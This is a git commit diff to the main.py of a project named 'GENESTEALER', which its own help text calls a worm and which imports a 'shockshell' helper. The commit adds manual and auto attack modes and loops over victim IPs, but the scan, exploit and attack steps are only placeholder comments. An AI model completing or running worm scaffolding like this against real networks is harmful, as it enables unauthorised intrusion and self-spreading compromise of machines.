17fd041407f162ffd06a8ea795db7ce986321bdc
Marcus <m.ar.agard@protonmail.ch>
2020-01-14 06:02:54 -0500

    Pulling all pieces together

--- main.py
+++ main.py
@@ -7,19 +7,30 @@ from shocker import shockshell
 
 def main():
     parser = argparse.ArgumentParser(prog="GENESTEALER")
-    parser.add_argument('target',
-                        help="Initial target for worm",
-                        type=ip_address)
-    parser.add_argument('-i', '--ignore',
-                        help="IP addr(s) to ignore",
+    parser.add_argument('mode',
+                        choices=["manual", "auto"],
+                        help="Whether to expect specified targets or not")
+    parser.add_argument('--target',
                         action='extend',
                         nargs='+',
-                        metavar='safe_ip',
+                        help="Initial target for worm (only for manual attack mode)",
                         type=ip_address)
 
     args = parser.parse_args()
-    print(args)
 
+    if args.mode == 'manual' and args.target is None:
+        parser.error("Manual mode specified but no target given!")
+    else:
+        if args.mode == 'manual':
+            for victim_ip in args.target:
+                print(f"Manual attack started against {victim_ip}")
+                # scan
+                # print scan output
+                # id exploit to use
+                # attack
+        else:
+            # The same but for all visible network ranges
+            pass
 
 if __name__ == '__main__':
     main()
